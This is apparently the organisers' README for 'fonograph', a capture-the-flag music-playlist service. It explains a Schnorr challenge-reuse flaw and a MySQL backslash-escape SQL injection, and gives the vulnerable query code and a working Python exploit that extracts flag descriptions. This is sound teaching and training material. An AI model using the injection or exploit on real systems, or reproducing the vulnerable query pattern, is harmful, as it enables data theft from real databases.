# fonograph

| Service     | Name                                                                                                        |
| :---------- | :---------------------------------------------------------------------------------------------------------- |
| Authors     | Francesco Felet <@PhiQuadro>, Aleandro Prudenzano <@drw0if>                                                 |
| Stores      | 1                                                                                                           |
| Categories  | crypto, web                                                                                                 |
| Port        | TCP 5000                                                                                                    |
| FlagIds     | store1: [playlist_ids]                                                                                      |
| Checkers    | [store1](/checkers/fonograph/checker.py)                                                                    |

## Description
fonograph is an Italian classical music streaming service. Users can make custom playlists out of a prefixed set of songs, served by a central entity outside of the scope of the competition. Users can choose their favorite avatar to associate to their playlist. Users can also share a token out of band that allows a friend to see the respective playlist. The token is verified via the Schnorr identification protocol.

Users can interact with the service via a python client, which has a GUI developed with pygame_gui. The communication with the server happens over websocket, with a layer of encryption using a noise protocol.

## Vulnerabilities

### Store 1 (crypto, web):
Flags are located in the descriptions of playlists created by the checker bot. Flag ids are the playlist ids relevant for the current round.

#### Vuln 1: challenge leak
The challenge provided by the server for the Schnorr identification protocol allowing for the sharing of a playlist is bound to the user and not rerandomized correctly: if an attacker manages to know it before sending the commitment, they can just craft appropriate values to pass the check. The protocol is divided in two steps (`init_get_shared_playlist` and `finish_get_shared_playlist`), rerandomization happens in the second step. An attacker can just call the first step two times to be able to craft everything needed to pass the check (after getting the public key). Fix: randomize the challenge correctly, while not breaking the protocol (the second step still needs to remember the challenge given to the user in the last invocation of the first step).

#### Vuln 2: SQL injection
All the `select` queries are built interpolating user provided parameters directly into the query.
The sanitization function that checks all the parameters is the following:
```python
def check_data(self, data):
    for d in data:
        if any([x in d for x in ["'", '"', ";", "--", "/*", "*/"]]):
            raise DBException("Invalid data")
```

While the qeueries are built like:
```python
def get_user(self, username):
    cursor = self.get_cursor()
    self.check_data([username])

    cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
    user = cursor.fetchone()

    self.commit()

    return user
```

Recalling that the used database is MySQL we can notice that the single quote (`'`) can be escaped in two ways:
- by doubling it: `''`;
- by using the common escape sequences with backslash: `\'`.

While the first one is prevented, the latter is not, and can actually be abused to perform SQL injection.
This trick can be abused in the context in which we have more than one controlled parameters, suppose we have two of them: we can use the first parameter to escape the closing quote, which gets extended to the second controlled parameter, and then the second parameter is treated as a SQL syntax.

The only available endpoint which allows at least two user controlled parameters is `get_playlist`.

Another stuff to care about is how to create the correct syntax to get the wanted playlist id, in fact the restrictions are still in place even if our payload is already out of the string literal.
There are various approaches, one of them is to build the syntax to filter on using `char(<int>)` and `concat(...)` SQL functions.

In the end a possible exploit would be:
```python
from modules.client import Client
import asyncio
import json

import sys

async def exploit(ip, flag_id):
    playlist_id = flag_id
    uri = f"ws://{ip}:5000/api"
    client = Client(uri)
    client.logger.setLevel(50)
       
    encoded_string = [hex(ord(x)) for x in playlist_id]
    encoded_string = [f"char({x})" for x in encoded_string]
    encoded_string = ",".join(encoded_string)
    encoded_string = f"concat({encoded_string})"

    request = {
        'action': 'GET_PLAYLIST',
        'params': {
            'token': f" OR p.id = {encoded_string} # ",
            'playlist_id': "\\"
        }
    }
    response = await client.send(request)
    return response["description"]

if __name__ == "__main__":
    ip = sys.argv[1]
    flag_id = sys.argv[2]
    print(asyncio.run(exploit(ip, flag_id)))
```


## Exploits

| Store | Exploit                                                                                      |
| :---: | :------------------------------------------------------------------------------------------- |
|   1   | [chall_leak](/exploits/fonograph/chall_leak.py)                                              |
|   1   | [web_exploit](/exploits/fonograph/web_exploit.py)                                            |
